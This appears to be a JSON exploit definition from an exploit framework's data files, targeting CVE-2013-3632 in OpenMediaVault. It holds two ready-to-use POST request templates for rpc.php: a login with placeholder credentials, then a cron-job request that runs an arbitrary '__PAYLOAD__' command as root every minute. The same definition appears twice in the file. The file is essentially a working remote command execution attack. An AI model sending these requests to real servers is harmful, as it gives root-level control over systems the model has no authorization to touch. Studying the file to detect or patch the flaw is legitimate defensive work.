{
   "type" : "MSF",
   "platform" : "MULTI",
   "description" : "\n\n      OpenMediaVault allows an authenticated user to create cron jobs as arbitrary users on the system.\n\n      An attacker can abuse this to run arbitrary commands as any user available on the system (including root).\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "title" : "OpenMediaVault Cron Remote Command Execution",
   "cve" : "CVE-2013-3632",
   "name" : "OpenmediavaultCmdExec",
   "msf_module" : "openmediavault_cmd_exec",
   "references" : [
      "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "rpc.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "HEADERS" : {
            "Content-Type" : "application/json",
            "Cookie" : ""
         },
         "PAYLOAD" : "{\"service\":\"Authentication\",\"method\":\"login\",\"params\":{\"username\":\"__USERNAME__\",\"password\":\"__PASSWORD__\"}}",
         "TEXT" : "Sending Exploit #1 Request : [POST] /rpc.php"
      },
      "EXPLOIT2" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /rpc.php",
         "PAYLOAD" : "{\"service\":\"Cron\",\"method\":\"set\",\"params\":{\"enable\":true,\"minute\":\"*\",\"hour\":\"*\",\"dayofmonth\":\"*\",\"month\":\"*\",\"dayofweek\":\"*\",\"username\":\"root\",\"command\":\"__PAYLOAD__\",\"comment\":\"\",\"type\":\"userdefined\",\"everynminute\":false,\"everynhour\":false,\"everyndayofmonth\":false,\"sendemail\":false,\"uuid\":\"undefined\"}}",
         "HEADERS" : {
            "Content-Type" : "application/json",
            "Cookie" : ""
         },
         "METHOD" : "POST",
         "PATH" : "rpc.php"
      }
   },
   "informations" : {
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "REFERENCES" : [
         "https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats"
      ],
      "MSF_MODULE" : "openmediavault_cmd_exec",
      "DESCRIPTION" : "\n\n      OpenMediaVault allows an authenticated user to create cron jobs as arbitrary users on the system.\n\n      An attacker can abuse this to run arbitrary commands as any user available on the system (including root).\n\n      ",
      "name" : "OpenmediavaultCmdExec",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /rpc.php",
            "PAYLOAD" : "{\"service\":\"Cron\",\"method\":\"set\",\"params\":{\"enable\":true,\"minute\":\"*\",\"hour\":\"*\",\"dayofmonth\":\"*\",\"month\":\"*\",\"dayofweek\":\"*\",\"username\":\"root\",\"command\":\"__PAYLOAD__\",\"comment\":\"\",\"type\":\"userdefined\",\"everynminute\":false,\"everynhour\":false,\"everyndayofmonth\":false,\"sendemail\":false,\"uuid\":\"undefined\"}}",
            "HEADERS" : {
               "Content-Type" : "application/json",
               "Cookie" : ""
            },
            "METHOD" : "POST",
            "PATH" : "rpc.php"
         },
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "rpc.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "HEADERS" : {
               "Content-Type" : "application/json",
               "Cookie" : ""
            },
            "PAYLOAD" : "{\"service\":\"Authentication\",\"method\":\"login\",\"params\":{\"username\":\"__USERNAME__\",\"password\":\"__PASSWORD__\"}}",
            "TEXT" : "Sending Exploit #1 Request : [POST] /rpc.php"
         }
      },
      "CVE" : "CVE-2013-3632",
      "TITLE" : "OpenMediaVault Cron Remote Command Execution"
   },
   "detection" : {}
}
